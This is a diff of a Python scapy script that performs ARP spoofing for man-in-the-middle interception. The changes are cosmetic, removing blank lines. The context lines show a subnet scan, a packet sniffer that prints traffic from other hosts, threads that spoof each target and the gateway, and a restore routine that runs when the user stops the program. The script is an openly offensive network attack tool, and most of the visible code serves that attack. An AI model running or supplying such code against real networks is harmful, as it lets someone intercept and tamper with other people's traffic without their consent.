@@ -37,7 +37,6 @@ icmp_codes = {
     12: "Host Unreachable for ToS"
 }
 
-
 # function gets the subnet mask in either CIDR notation or dotted dicimal format that is changed to CIDR.
 def get_mask():
     while True:
@@ -86,7 +85,6 @@ def scan(default_gateway, mask, targetdict, my_ip):
 def sniff_packets(target_list, my_mac):
     scapy.sniff(  filter=f"ether src not {my_mac}" ,prn=lambda pkt: packet_handler(pkt, target_list), store=False)
     
-
 # function gets the packets and prints them
 def packet_handler(pkt, target_list):
     try:   
@@ -162,7 +160,6 @@ def spoof(Target_ip, Target_mac, Src_ip, my_mac, stop_event):
             print(f"Error sending spoofed packet: {e}")
     print(f"stopped spoofing {Src_ip}")
 
-
 def restore(default_gateway, router_mac, targets):
     for target_ip, target_mac in targets.items():
         # send the correct ARP information to the target and the router to restore the connection
@@ -170,7 +167,6 @@ def restore(default_gateway, router_mac, targets):
         ether = scapy.Ether(dst=target_mac)
         packet = ether / arp_response
         scapy.sendp(packet, count=8, verbose=0)        
-        
         # also restore the connection on the router side           
         arp_response = scapy.ARP(pdst=default_gateway, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac, op='is-at')
         ether = scapy.Ether(dst=router_mac)
@@ -205,11 +201,9 @@ def main():
     my_ip=scapy.get_if_addr(scapy.conf.iface)
     my_mac=scapy.get_if_hwaddr(scapy.conf.iface)
     scan(default_gateway, mask, targetdict, my_ip)
-
     # if no devices were found exit the program
     if not targetdict:
         return
-
     # create one sniffer process
     sniffer_proc = threading.Thread(target=sniff_packets, args=(sniff_targets,my_mac),daemon=True)
     sniffer_proc.start()
@@ -226,14 +220,11 @@ def main():
             threads.append(t1)
             threads.append(t2)
             time.sleep(2)
-
         # wait for all processes to finish
-        print("All threads started. Press Ctrl+C to stop.")
-        
+        print("All threads started. Press Ctrl+C to stop.")      
         # keep the main thread alive to listen for KeyboardInterrupt
         while True:
             input()
-
     except KeyboardInterrupt:
         print("cntl c was pressed, stopping ARP spoofing and restoring connection..")
         stop_event.set()
